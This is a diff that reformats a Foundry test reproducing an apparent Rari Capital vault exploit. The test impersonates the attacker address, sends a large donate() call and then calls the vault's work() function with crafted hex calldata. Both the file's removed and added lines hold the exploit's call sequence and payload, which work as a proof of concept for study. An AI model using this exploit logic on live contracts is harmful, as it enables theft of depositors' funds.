@@ -11,19 +11,15 @@ import {IERC20} from "src/interfaces/IERC20.sol";
     
     run: forge test --contracts ./src/test/RariCapital_exp.sol -vvv  */
 interface Bank {
-    function work(
-        uint256 id,
-        address goblin,
-        uint256 loan,
-        uint256 maxReturn,
-        bytes calldata data
-    ) external payable;
+
+    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data) external payable;
+
 }
 
 contract ContractTest is Test {
+
     Bank vault = Bank(0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A);
-    IERC20 fakeToken =
-        IERC20(payable(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46));
+    IERC20 fakeToken = IERC20(payable(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46));
     address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
 
     function setUp() public {
@@ -31,39 +27,23 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "[Start] ETH Balance of attacker",
-            attacker.balance,
-            18
-        );
+        emit log_named_decimal_uint("[Start] ETH Balance of attacker", attacker.balance, 18);
 
-        bytes
-            memory data = hex"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+        bytes memory data =
+            hex"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
 
-        vm.startPrank(
-            0xCB36b1ee0Af68Dce5578a487fF2Da81282512233,
-            0xCB36b1ee0Af68Dce5578a487fF2Da81282512233
-        );
-        (bool success, bytes memory result) = address(
-            0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46
-        ).call{value: 1_031_000_000_000_000_000_000}(
-            abi.encodeWithSignature("donate()")
-        );
+        vm.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
+        (bool success, bytes memory result) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{
+            value: 1_031_000_000_000_000_000_000
+        }(abi.encodeWithSignature("donate()"));
         success;
         result;
 
         vault.work{value: 100_000_000}(
-            0,
-            0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24,
-            0,
-            100_000_000_000_000_000_000_000,
-            data
+            0, 0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24, 0, 100_000_000_000_000_000_000_000, data
         );
 
-        emit log_named_decimal_uint(
-            "[End] ETH Balance of attacker",
-            attacker.balance,
-            18
-        );
+        emit log_named_decimal_uint("[End] ETH Balance of attacker", attacker.balance, 18);
     }
+
 }
